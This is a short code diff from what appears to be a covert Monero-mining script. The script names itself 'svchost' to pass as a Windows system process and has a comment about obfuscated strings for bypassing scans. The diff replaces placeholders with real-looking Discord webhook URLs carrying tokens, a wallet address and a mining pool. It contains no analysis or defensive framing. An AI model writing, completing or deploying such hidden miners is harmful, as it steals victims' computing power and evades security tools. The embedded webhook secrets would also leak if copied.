@@ -6,9 +6,9 @@ parser.add_argument("--id", default="svchost")
 ID = parser.parse_known_args()[0].id
 
 # CONFIG - PUT YOUR INFO HERE
-WEBHOOK_SYS = "YOUR_SYSTEM_ALERTS_WEBHOOK"
-WEBHOOK_MINE = "YOUR_MINING_LOGS_WEBHOOK"
-WALLET = "YOUR_MONERO_WALLET"
+WEBHOOK_SYS = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
+WEBHOOK_MINE = "https://discord.com/api/webhooks/1503876364632326145/YlQ62WNi8sPyYeiAfT9nIB25FPR4kMoP71QSENKu06xUNIAJWbiXKJJ-7pa1foOfl4HB"
+WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 POOL = "pool.supportxmr.com:443"
 
 # Obfuscated Strings (Bypassing scans)
